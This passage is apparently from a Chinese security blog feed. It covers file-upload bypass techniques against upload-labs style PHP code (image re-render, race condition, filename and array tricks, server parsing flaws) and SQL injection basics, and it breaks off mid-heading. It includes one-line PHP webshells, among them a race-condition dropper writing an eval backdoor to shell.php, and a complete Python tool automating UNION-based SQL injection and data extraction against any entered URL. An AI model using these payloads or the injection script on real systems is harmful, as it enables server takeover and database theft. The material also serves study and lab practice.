class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-17-绕过图片二次渲染上传"><a href="#2-5-17-绕过图片二次渲染上传" class="headerlink" title="2.5.17 绕过图片二次渲染上传"></a>2.5.17 绕过图片二次渲染上传</h2><h3 id="绕过图片二次渲染上传方法"><a href="#绕过图片二次渲染上传方法" class="headerlink" title="绕过图片二次渲染上传方法"></a>绕过图片二次渲染上传方法</h3><p>首先判断图片是否允许上传 gif，gif 图片在二次渲染后，与原图片差别不会太大。所以二次渲染攻击最好用 gif 图片马。</p><p>制作图片马</p><p>将原图片上传，下载渲染后的图片进行对比，找相同处，覆盖字符串，填写一句话后门，或者恶意指令。</p><p>原图片与渲染后的图片这个位置的字符串没有改变所在原图片这里替换成一句话木马<? php phpinfo();?>直接上传即可</p><p>再用文件包含漏洞传参file为图片路径即可 getshell</p><p>一般不会对渲染之后的再次渲染</p><h3 id="绕过图片二次渲染上传原理"><a href="#绕过图片二次渲染上传原理" class="headerlink" title="绕过图片二次渲染上传原理"></a>绕过图片二次渲染上传原理</h3><p>有些图片上传，会对上传的图片进行二次渲染后在保存，体积可能会更小，图片会模糊一些，但是符合网站的需求。例如新闻图片封面等可能需要二次渲染，因为原图片占用的体积更大。访问的人数太多时候会占用，很大带宽。二次渲染后的图片内容会减少，如果里面包含后门代码，可能会被省略。导致上传的图片马，恶意代码被清除。</p><h3 id="绕过图片二次渲染上传代码分析"><a href="#绕过图片二次渲染上传代码分析" class="headerlink" title="绕过图片二次渲染上传代码分析"></a>绕过图片二次渲染上传代码分析</h3><p>只允许上传 JPG PNG gif 在源码中使用 imagecreatefromgif 函数对图片进行二次生成。生成的图片保存在，upload 目录下</p><p>$is_upload &#x3D; false;<br>$msg &#x3D; null;<br>if (isset($_POST[‘submit’])){<br>    &#x2F;&#x2F; 获得上传文件的基本信息，文件名，类型，大小，临时文件路径<br>    $filename &#x3D; $_FILES[‘upload_file’][‘name’];<br>    $filetype &#x3D; $_FILES[‘upload_file’][‘type’];<br>    $tmpname &#x3D; $_FILES[‘upload_file’][‘tmp_name’];</p><pre><code>$target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);// 获得上传文件的扩展名$fileext= substr(strrchr($filename,&quot;.&quot;),1);//判断文件后缀与类型，合法才进行上传操作if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;    if(move_uploaded_file($tmpname,$target_path))&#123;        //使用上传的图片生成新的图片        $im = imagecreatefromjpeg($target_path);        if($im == false)&#123;            $msg = &quot;该文件不是jpg格式的图片！&quot;;            @unlink($target_path);        &#125;else&#123;            //给新图片指定文件名            srand(time());            $newfilename = strval(rand()).&quot;.jpg&quot;;            //显示二次渲染后的图片（使用用户上传图片生成的新图片）            $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;            imagejpeg($im,$img_path);            @unlink($target_path);            $is_upload = true;        &#125;    &#125; else &#123;        $msg = &quot;上传出错！&quot;;    &#125;&#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;    if(move_uploaded_file($tmpname,$target_path))&#123;        //使用上传的图片生成新的图片        $im = imagecreatefrompng($target_path);        if($im == false)&#123;            $msg = &quot;该文件不是png格式的图片！&quot;;            @unlink($target_path);        &#125;else&#123;             //给新图片指定文件名            srand(time());            $newfilename = strval(rand()).&quot;.png&quot;;            //显示二次渲染后的图片（使用用户上传图片生成的新图片）            $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;            imagepng($im,$img_path);            @unlink($target_path);            $is_upload = true;                       &#125;    &#125; else &#123;        $msg = &quot;上传出错！&quot;;    &#125;&#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;    if(move_uploaded_file($tmpname,$target_path))&#123;        //使用上传的图片生成新的图片        $im = imagecreatefromgif($target_path);        if($im == false)&#123;            $msg = &quot;该文件不是gif格式的图片！&quot;;            @unlink($target_path);        &#125;else&#123;            //给新图片指定文件名            srand(time());            $newfilename = strval(rand()).&quot;.gif&quot;;            //显示二次渲染后的图片（使用用户上传图片生成的新图片）            $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;            imagegif($im,$img_path);            @unlink($target_path);            $is_upload = true;        &#125;    &#125; else &#123;        $msg = &quot;上传出错！&quot;;    &#125;&#125;else&#123;    $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;&#125;</code></pre><p>}</p><h2 id="2-5-18-文件上传条件竞争漏洞绕过"><a href="#2-5-18-文件上传条件竞争漏洞绕过" class="headerlink" title="2.5.18 文件上传条件竞争漏洞绕过"></a>2.5.18 文件上传条件竞争漏洞绕过</h2><h3 id="文件上传条件竞争漏洞绕过方法"><a href="#文件上传条件竞争漏洞绕过方法" class="headerlink" title="文件上传条件竞争漏洞绕过方法"></a>文件上传条件竞争漏洞绕过方法</h3><p>生成小马：<br>1.php <?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["a"])?>‘);?&gt;</p><p>上传 php 后门脚本，上传之后用 burpsutie 设置访问，线程建议体提高一些。</p><p>抓包上传 php 文件 设置变量可以是数值，也可以是null，不停的提交这包</p><h3 id="文件上传条件竞争漏洞绕过"><a href="#文件上传条件竞争漏洞绕过" class="headerlink" title="文件上传条件竞争漏洞绕过"></a>文件上传条件竞争漏洞绕过</h3><h3 id="文件上传条件竞争漏洞绕过代码分析"><a href="#文件上传条件竞争漏洞绕过代码分析" class="headerlink" title="文件上传条件竞争漏洞绕过代码分析"></a>文件上传条件竞争漏洞绕过代码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件先到服务器，然后判断是否合法，在这其中有短暂的时间能够让我们访问，线程数过多时，没处理过来</p><h2 id="2-5-19-文件名可控绕过上传"><a href="#2-5-19-文件名可控绕过上传" class="headerlink" title="2.5.19 文件名可控绕过上传"></a>2.5.19 文件名可控绕过上传</h2><p>pass-20</p><h3 id="文件名可控绕过上传方法"><a href="#文件名可控绕过上传方法" class="headerlink" title="文件名可控绕过上传方法"></a>文件名可控绕过上传方法</h3><ul><li>可控文件名后加   &#x3D;&#x3D;‘.’    ‘ ‘    ‘. ‘   ‘.‘&#x3D;&#x3D;都可行前三个与windows系统特征有关，后一个是由于move移动文件的函数会将其过滤</li><li>上传数据包，上传文件为jpg文件1.jpg，抓包改名为1.php .jpg,然后将空格转换为空，也就是十六进制为00，空格十六进制为20，十进制为32；</li><li>同样利用，windows系统特征可抓包将文件名后缀加上::$DATA</li></ul><h3 id="文件名可控绕过上传原理"><a href="#文件名可控绕过上传原理" class="headerlink" title="文件名可控绕过上传原理"></a>文件名可控绕过上传原理</h3><p>文件上传时,文件名的可被客户端修改控制,会导致漏洞产生。</p><h3 id="文件名可控绕过上传代码分析"><a href="#文件名可控绕过上传代码分析" class="headerlink" title="文件名可控绕过上传代码分析"></a>文件名可控绕过上传代码分析</h3><p>先判断再上传到服务器，故不存在竞争<br>采用黑名单限制上传文件,但是 $_POST[‘save_name’]文件是可控的,可被客户端任意修改,造成安全漏洞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-20-数组绕过攻击方法"><a href="#2-5-20-数组绕过攻击方法" class="headerlink" title="2.5.20 数组绕过攻击方法"></a>2.5.20 数组绕过攻击方法</h2><h3 id="数组绕过攻击方法方法"><a href="#数组绕过攻击方法方法" class="headerlink" title="数组绕过攻击方法方法"></a>数组绕过攻击方法方法</h3><p>上传php文件，抓包修改conten-type，并且修改save_name为save_name[0]，值为1.php<br>然后复制，变为save_name[3]，值为jpg&#x2F;png&#x2F;jif（大于2就行）</p><h3 id="数组绕过攻击方法原理"><a href="#数组绕过攻击方法原理" class="headerlink" title="数组绕过攻击方法原理"></a>数组绕过攻击方法原理</h3><p>有的文件上传，如果支持数组上传或者数组命名。如果逻辑写的有问题会造成安全隐患，导致不可预期的上传。这种上传攻击，它是属于攻击者白盒审计后发现的漏洞居多</p><h3 id="数组绕过攻击方法代码分析"><a href="#数组绕过攻击方法代码分析" class="headerlink" title="数组绕过攻击方法代码分析"></a>数组绕过攻击方法代码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.php<br>1<br>php<br>file[0]&#x3D;1;<br>file[1]&#x3D;php;<br>令一个file[3]&#x3D;jpg;<br>则end($file)&#x3D;jpg;<br>而$file[count($file) - 1]&#x3D;null&#x3D;$file[2];<br>count为实际有效值，只有三个<br>又$file[2]没有值，为null</p><h2 id="2-5-21-文件上传其他漏洞"><a href="#2-5-21-文件上传其他漏洞" class="headerlink" title="2.5.21 文件上传其他漏洞"></a>2.5.21 文件上传其他漏洞</h2><p>nginx 0.83 &#x2F;1.jpg%00php</p><p>apahce 1x 或者 2x</p><p>当 apache 遇见不认识的后缀名，会从后向前解析例如 1.php.rar 不认识 rar 就向前解析，直到知道它认pass-19</p><p>识的后缀名。</p><p>phpcgi 漏洞(nginx iis7 或者以上) 上传图片后 1.jpg。访问 1.jpg&#x2F;1.php 也会解析成 php。</p><p>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</p><p>apache 通过 mod_php 来运行脚本，其 2.4.0-2.4.29 中存在apache 换行解析漏洞，在解析php 时 xxx.php\x0A</p><p>将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略。</p>]]></content>
      
      
      
        <tags>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql自动化注入脚本union</title>
      <link href="/2025/05/04/sql%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%ACunion/"/>
      <url>/2025/05/04/sql%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%ACunion/</url>
      
        <content type="html"><![CDATA[<p>import requests<br>import time<br>from urllib.parse import urljoin, quote</p><p>class UnionInjector:<br>    def <strong>init</strong>(self, url):<br>        self.url &#x3D; url<br>        self.headers &#x3D; {<br>            ‘User-Agent’: ‘Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36’<br>        }<br>        self.timeout &#x3D; 10<br>        self.delay &#x3D; 1  # 请求间隔，避免触发WAF</p><pre><code>def test_columns(self, param_name, max_columns=10):    print(&quot;[*] 开始测试列数...&quot;)    for i in range(1, max_columns + 1):        # 构造NULL联合查询        nulls = &#39;,&#39;.join([&#39;NULL&#39;] * i)        payload = f&quot;&#39; UNION SELECT &#123;nulls&#125;-- -&quot;        encoded_payload = quote(payload)                try:            response = self.send_request(param_name, encoded_payload)                        # 如果页面正常返回，可能找到正确的列数            if response and response.status_code == 200:                print(f&quot;[+] 可能的列数: &#123;i&#125;&quot;)                print(f&quot;[+] 使用的Payload: &#123;payload&#125;&quot;)                return i                            time.sleep(self.delay)  # 请求间隔                    except Exception as e:            print(f&quot;[-] 测试列数 &#123;i&#125; 时出错: &#123;str(e)&#125;&quot;)            continue        return Nonedef test_string_column(self, param_name, num_columns):    print(&quot;\n[*] 开始测试字符串列...&quot;)    test_str = &#39;TRAE&#39;        for i in range(1, num_columns + 1):        # 构造测试字符串的查询        columns = [&#39;NULL&#39;] * num_columns        columns[i-1] = f&quot;&#39;&#123;test_str&#125;&#39;&quot;        payload = f&quot;&#39; UNION SELECT &#123;&#39;,&#39;.join(columns)&#125;-- -&quot;        encoded_payload = quote(payload)                try:            response = self.send_request(param_name, encoded_payload)                        if response and response.status_code == 200:                if test_str in response.text:                    print(f&quot;[+] 发现字符串列: &#123;i&#125;&quot;)                    print(f&quot;[+] 使用的Payload: &#123;payload&#125;&quot;)                    return i                                time.sleep(self.delay)                    except Exception as e:            print(f&quot;[-] 测试字符串列 &#123;i&#125; 时出错: &#123;str(e)&#125;&quot;)            continue        return Nonedef extract_data(self, param_name, num_columns, string_column):    print(&quot;\n[*] 开始提取数据...&quot;)        # 常用的数据库信息查询    queries = [        &quot;version()&quot;,           # 数据库版本        &quot;database()&quot;,          # 当前数据库        &quot;user()&quot;,              # 当前用户        &quot;@@datadir&quot;,          # 数据库路径        &quot;system_user()&quot;,       # 系统用户        &quot;session_user()&quot;      # 会话用户    ]        for query in queries:        columns = [&#39;NULL&#39;] * num_columns        columns[string_column-1] = query        payload = f&quot;&#39; UNION SELECT &#123;&#39;,&#39;.join(columns)&#125;-- -&quot;        encoded_payload = quote(payload)                try:            response = self.send_request(param_name, encoded_payload)                        if response and response.status_code == 200:                print(f&quot;[+] &#123;query&#125;: &#123;response.text&#125;&quot;)                            time.sleep(self.delay)                    except Exception as e:            print(f&quot;[-] 提取 &#123;query&#125; 时出错: &#123;str(e)&#125;&quot;)            continuedef send_request(self, param_name, payload):    test_url = f&quot;&#123;self.url&#125;?&#123;param_name&#125;=&#123;payload&#125;&quot;    return requests.get(        test_url,        headers=self.headers,        timeout=self.timeout    )</code></pre><p>def main():<br>    print(“UNION联合注入测试工具”)<br>    print(“&#x3D;” * 50)</p><pre><code>while True:    url = input(&quot;\n请输入目标URL (输入q退出): &quot;)    if url.lower() == &#39;q&#39;:        break            if not url.startswith((&#39;http://&#39;, &#39;https://&#39;)):        url = &#39;http://&#39; + url            param_name = input(&quot;请输入参数名: &quot;)        injector = UnionInjector(url)        # 1. 测试列数    num_columns = injector.test_columns(param_name)    if not num_columns:        print(&quot;[-] 未能确定列数&quot;)        continue            # 2. 测试字符串列    string_column = injector.test_string_column(param_name, num_columns)    if not string_column:        print(&quot;[-] 未能找到字符串列&quot;)        continue            # 3. 提取数据    injector.extract_data(param_name, num_columns, string_column)</code></pre><p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>    main()</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入相关知识</title>
      <link href="/2025/04/20/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/04/20/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="名字"><a href="#名字" class="headerlink" title="名字"></a>名字</h1><p>重要数据库名：information_schema;<br>重要的表名：columns,tables,<br>SCHEMA_NAME—记录库的信息；<br>table表字段名TABLE_NAME——记录表名；<br>table表字段名TABLE_SCHEMA——记录库名；<br>columns 存储该用户创建的所有数据库的库名、标名和字段名。</p><ul><li>通过 infomation_schema 查询 www_dvwa_com 库里所有的表和字段</li></ul><p>select * from information_schema.<code>COLUMNS</code> where TABLE_SCHEMA&#x3D;’www_dvwa_com’；<br>（where表条件）<br>数据库.表名 这种查询方法是指定某个数据库某个表 <code> </code> 这个符号可以忽略不用；</p><ul><li>查询某个库某个表的字段可以这样查询</li></ul><p>select * from information_schema.COLUMNS where</p><p>TABLE_SCHEMA&#x3D;’www_dvwa_com’ and TABLE_NAME&#x3D;’users’<br>（’*’为通配符）</p><h1 id="sql注释符"><a href="#sql注释符" class="headerlink" title="sql注释符"></a>sql注释符</h1><p>  ‘# ’单行注释<br>注意与 url 中的#区分，常编码为%23</p><p>–空格&#x2F;+ 单行注释 注意为短线短线空格</p><p>&#x2F;<em>（）</em>&#x2F; 多行注释 至少存在俩处的注入</p><p>&#x2F;* * &#x2F;常用来作为空格；</p><h1 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h1><p>SQL 注入分类：按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种：</p><p>UNION query SQL injection（可联合查询注入）[[1.5 UNION联合注入]]</p><p>Stacked queries SQL injection（可多语句查询注入）堆叠查询Boolean-based blind SQL injection（布尔型注入）</p><p>Error-based SQL injection（报错型注入）</p><p>Time-based blind SQL injection（基于时间延迟注入）</p><h1 id="接受请求类型区分"><a href="#接受请求类型区分" class="headerlink" title="接受请求类型区分"></a>接受请求类型区分</h1><p>GET 注入：</p><p>GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要URL 编码</p><p>POST 注入：</p><p>POST 请求参数是放在请求 body 里的，长度没有限制</p><p>COOKIE 注入：</p><p>cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取</p><h1 id="注入数据类型的区分"><a href="#注入数据类型的区分" class="headerlink" title="注入数据类型的区分"></a>注入数据类型的区分</h1><p>int 整型</p><p>select * from users where id&#x3D;1</p><p>sting 字符型</p><p>select * from users where username&#x3D;’admin’</p><p>like 搜索型</p><p>select * from news where title like ‘%标题%’</p><h1 id="1-2-SQL注入原理"><a href="#1-2-SQL注入原理" class="headerlink" title="1.2 SQL注入原理"></a>1.2 SQL注入原理</h1><p>构造一条精巧的语句得到自己想要的信息；<br>SQL 注入漏洞的产生需要满足以下两个条件</p><p>参数用户可控：从前端传给后端的参数内容是用户可以控制的</p><p>参数带入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询。<br>当传入参数为 1’的时候,在数据库执行如下所示。</p><p>select * from users where id&#x3D;1’</p><p>此 SQL 语句不符合语法规则就会报错。</p><p>You have an error in your SQL syntax; check the manual that corresponds to your</p><p>MySQL server version for the right syntax to use near ‘’’ at line 1</p><p>当传入参数为 1 and 1&#x3D;1 时</p><p>select * from users where id&#x3D;1 and 1&#x3D;1</p><p>因为 1&#x3D;1 为真 id&#x3D;1 也是真 and 两边均为真 所以页面会返回 id&#x3D;1 的结果。</p><p>如果传入参数为 1 and 1&#x3D;2 时</p><p>因为 1&#x3D;2 为假 id&#x3D;1 为真 and 两边有一个为假，所以页面返回与 id&#x3D;1 不一样的结果。</p><p>由此可以初步判断存在 SQL 注入漏洞，我们可以进一步拼接 SQL 攻击语句，</p><p>进行攻击，致使信息泄露，甚至获取服务器权限。</p><h1 id="1-3-判断是否存在注入"><a href="#1-3-判断是否存在注入" class="headerlink" title="1.3 